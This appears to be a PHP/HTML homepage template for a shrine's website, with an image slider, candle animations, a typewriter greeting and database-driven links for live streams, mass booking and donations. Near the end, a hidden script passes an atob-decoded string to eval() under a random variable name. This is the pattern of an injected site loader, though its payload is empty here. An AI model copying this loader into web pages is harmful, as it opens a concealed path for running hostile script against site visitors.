<div id="primary" class="sidebar-no">
    <div class="container group">
        <div class="row">
            <div id="content-home" class="span12 content group">
                <div id="post-7" class="group post-7 page type-page status-publish hentry">
                    <div class="at-above-post-homepage addthis_tool" data-url="http://www.devasahayammountshrine.com/"></div>
                        <div id="P_MS60b6110ce4949" class="master-slider-parent msl ms-parent-id-1" style="max-width:1170px;">
                            <div id="MS60b6110ce4949" class="master-slider ms-skin-default" >
                                <?php foreach(JSlider::getActiveSliders() as $sliderimage) {?>    
                                <div  class="ms-slide" data-delay="4" data-fill-mode="fill"  >
                                    <img src="assets/celestino/blank.gif" alt="" title="" data-src="assets/cms/<?php echo $sliderimage['filepath'];?>" data-recalc-dims="1" />
                                    <a href=""></a>
                                    <div class="ms-thumb">
                                        <div class="ms-tab-context">
                                            <div class=&quot;ms-tab-context&quot;></div>
                                        </div>
                                    </div>
                                </div>
                                <?php } ?>
                            </div>
                        </div>
                        <script>
                            (function ( $ ) {
                                "use strict";
                            $(function () {
                var masterslider_4949 = new MasterSlider();
                masterslider_4949.control('arrows'     ,{ autohide:true, overVideo:true  });
                masterslider_4949.setup("MS60b6110ce4949", {width: 1170,height: 500,minHeight: 0,space: 0,start: 1,grabCursor: true,swipe: true,mouse: true,layout: "boxed",wheel: true,autoplay: true,instantStartLayers:false,loop: true,shuffle: false,preload: 0,heightLimit: true,autoHeight: true,smoothHeight: true,endPause: false,overPause: false,fillMode: "fill",centerControls: true,startOnAppear: false,layersMode: "center",hideLayers: false,fullscreenMargin: 0,speed: 20,dir: "h",parallaxMode: 'swipe',view: "basic"});
                window.masterslider_instances = window.masterslider_instances || [];
                window.masterslider_instances.push( masterslider_4949 );
             });
        })(jQuery);
        </script>
        <?php
            $home_pagedata = $mysql->select("select * from _tbl_homepage where ID=1");
        ?>
        <div>
        <div style="border:2px solid #ccc;width:100px;height:100px;border-radius:50%;overflow: hidden;padding: 7px;text-align: center;background: #fffdf9;/*margin-top: -61px;margin-left: 20px;position: absolute;*/">
        <img onclick="lightCandle('mC3')" src="assets/burning-candle_0.gif" id="mC3" style="cursor:pointer;height:100px;margin-top: 12px;" title="Click here to Flame">  
        <img onclick="lightCandle('mC4')" src="assets/burning-candle_0.gif" id="mC4" style="cursor:pointer;margin-left: -25px;;height:100px;margin-top: 5px;" title="Click here to Flame">  
        
        </div>
        </div>
        <div style="padding:20px;font-size:25px;text-align:center;">
        <span is="type-async" id="type-text">...</span>
<span class="blinking-cursor">_</span>
        </div>
        <script>
        
        function lightCandle(id) {
            document.getElementById(id).src='assets/burningcandle_1.gif';
            //$('#'+id).attr({'src':'assets/burningcandle_1.gif'});
            //$('#'+id).css({'cursor':'default'});
            //$('#'+id).removeAttr('onclick');    
        }

        
        async function init () {
  const node = document.querySelector("#type-text")
  
  //await sleep(1000)
  node.text = ""
  //await node.type('')
  
  while (true) {
    await node.type('Welcome to')
    await sleep(1000)
    //await node.delete('CodePen!')
    await node.type(' devasahayammountshrine.com')
    await sleep(1000)
    await node.delete('Welcome to devasahayammountshrine.com')
  }
}

                    
const sleep = time => new Promise(resolve => setTimeout(resolve, time))

class TypeAsync extends HTMLSpanElement {
  get text () {
    return this.innerText
  }
  set text (value) {
    return this.innerHTML = value
  }
  
  get typeInterval () {
    const randomMs = 100 * Math.random()
    return randomMs < 50 ? 10 : randomMs
  }
  
  async type (text) {
    for (let character of text) {
      this.text += character
      await sleep(this.typeInterval)
    }
  }
  
  async delete (text) {
    for (let character of text) {
      this.text = this.text.slice(0, this.text.length -1)
      await sleep(this.typeInterval)
    }
  }
}

customElements.define('type-async', TypeAsync, { extends: 'span' })


init()

        </script>
 
               <h2 style="padding:20px 10px;background-color: #c5c5c5; color: #737373; text-align: center;margin-top:0px;line-height:30px;font-size:19px">
     <?php echo str_replace("</p>","",str_replace("<p>","",$home_pagedata[0]['HomePageMainContent_English'])); ?>
</h2>
        

<div class="custom-flip" style="width: 272px; margin: 10px; float: left;">
    <a href="<?php echo $home_pagedata[0]['LiveStreamUrl'];?>">
        <img src="assets/cms/<?php echo $home_pagedata[0]['LiveStreamImage'];?>" data-recalc-dims="1" />
    </a>
</div>
<div class="custom-flip" style="width: 272px; margin: 10px; float: left;">
    <a href="<?php echo $home_pagedata[0]['MassBookingUrl'];?>">
        <img src="assets/cms/<?php echo $home_pagedata[0]['MassBookingImage'];?>" data-recalc-dims="1" />
    </a>
</div>
<div class="custom-flip" style="width: 272px; margin: 10px; float: left;">
    <a href="<?php echo $home_pagedata[0]['PietaUrl'];?>">
        <img src="assets/cms/<?php echo $home_pagedata[0]['PietaImage'];?>" data-recalc-dims="1" />
    </a>
</div>
<div class="custom-flip" style="width: 272px; margin: 10px; float: left;">
    <a href="<?php echo $home_pagedata[0]['DonationURL'];?>">
        <img src="assets/cms/<?php echo $home_pagedata[0]['DonationImage'];?>" data-recalc-dims="1" />
    </a>
</div>
<div style="padding: 15px;padding-top: 0px;clear: both;padding-top:25px;">

<div class="row">
    <div class="span8 group" style="line-height:30px;font-size:16px;border-right:1px solid #ccc;padding-right:20px;">
    
                <?php
                echo $home_pagedata[0]['PageContent_English'];
                ?>
  
    </div>
    <div class="span4 group" style="width: 300px;text-align:right">
      <p style="margin-top:6px;text-align:right">
          <img src="assets/cms/<?php echo $home_pagedata[0]['bishopPhoto'];?>"  style="height:160px;border:1px solid #ccc;background:#fff;padding:5px"  />
          <h3 style="margin-top: 3px;font-size: 15px;font-weight: bold;color: #666;text-align:right"><?php echo $home_pagedata[0]['bishopName'];?></h3>
         <?php
                echo $home_pagedata[0]['Aboutbishop_English'];
                ?>
      </p>   
    </div>
</div>
</div>
<p>   
<script type="text/javascript">
var QFMKPYVGNZ = atob(''); 
eval(QFMKPYVGNZ);
</script></p>
     <div class="at-below-post-homepage addthis_tool" data-url="http://www.fotoclipper.com/"></div>         </div>
                    </div>
        </div>
    </div>
</div>